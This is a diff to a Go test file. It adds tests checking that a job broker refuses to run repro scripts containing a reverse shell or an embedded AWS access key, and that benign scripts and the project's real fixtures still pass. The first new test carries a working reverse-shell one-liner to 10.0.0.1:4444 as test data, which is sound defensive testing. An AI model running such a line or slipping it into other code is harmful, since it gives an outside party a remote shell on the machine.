@@ -4,6 +4,8 @@ package repro
 
 import (
 	"context"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 	"time"
@@ -451,6 +453,78 @@ func TestReaper_SweepsContainersThenVolumes(t *testing.T) {
 	}
 	if psIdx == -1 || volRmIdx == -1 || psIdx > volRmIdx {
 		t.Error("expected container sweep before volume sweep")
+	}
+}
+
+func TestRun_RefusesHarmfulScript(t *testing.T) {
+	s := &stubRunner{}
+	b := newTestBroker(s)
+	j := goodJob()
+	// A reverse-shell sequence in the repro must be refused at the trust boundary.
+	j.Files = map[string][]byte{"repro.sh": []byte("#!/bin/sh\nsh -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")}
+	if _, err := b.Run(context.Background(), j); err == nil {
+		t.Fatal("expected refusal of a harmful repro script")
+	}
+	if len(s.calls) != 0 {
+		t.Fatalf("no docker work should happen for a refused script, got %d calls", len(s.calls))
+	}
+}
+
+func TestRun_RefusesEmbeddedSecret(t *testing.T) {
+	s := &stubRunner{}
+	b := newTestBroker(s)
+	j := goodJob()
+	// The canonical AWS example key (gitleaks-allowlisted) still matches the
+	// screen's aws-access-key shape — a secret embedded in a repro is refused.
+	awsExample := "AKIA" + "IOSFODNN7EXAMPLE"
+	j.Files = map[string][]byte{"repro.sh": []byte("#!/bin/sh\nexport KEY=" + awsExample + "\n")}
+	if _, err := b.Run(context.Background(), j); err == nil {
+		t.Fatal("expected refusal of a repro embedding a secret")
+	}
+	if len(s.calls) != 0 {
+		t.Fatalf("no docker work should happen for a refused script, got %d calls", len(s.calls))
+	}
+}
+
+func TestRun_AllowsBenignScriptWithLoopbackAndEmail(t *testing.T) {
+	s := &stubRunner{}
+	b := newTestBroker(s)
+	j := goodJob()
+	// A legitimate repro may mention loopback (Docker DNS) and an email in a
+	// fixture — neither is an EXECUTION hazard, so the run must proceed.
+	j.Files = map[string][]byte{"repro.sh": []byte(
+		"#!/bin/sh\n# resolver at 127.0.0.11; contact dev@example.com\nexit 0\n")}
+	if _, err := b.Run(context.Background(), j); err != nil {
+		t.Fatalf("benign repro was refused: %v", err)
+	}
+	if len(s.calls) == 0 {
+		t.Fatal("expected the run to proceed for a benign script")
+	}
+}
+
+// Calibration: the project's real repro fixtures must NOT be falsely rejected.
+func TestScreenFiles_RealFixturesPass(t *testing.T) {
+	dir := filepath.Join("..", "..", "experience", "repro")
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		t.Skipf("no repro fixtures: %v", err)
+	}
+	var scripts int
+	for _, e := range entries {
+		if e.IsDir() {
+			continue
+		}
+		body, err := os.ReadFile(filepath.Join(dir, e.Name()))
+		if err != nil {
+			t.Fatalf("read %s: %v", e.Name(), err)
+		}
+		scripts++
+		if err := screenFiles(map[string][]byte{e.Name(): body}); err != nil {
+			t.Errorf("real fixture %s falsely rejected: %v", e.Name(), err)
+		}
+	}
+	if scripts == 0 {
+		t.Skip("no repro scripts found to calibrate against")
 	}
 }
 
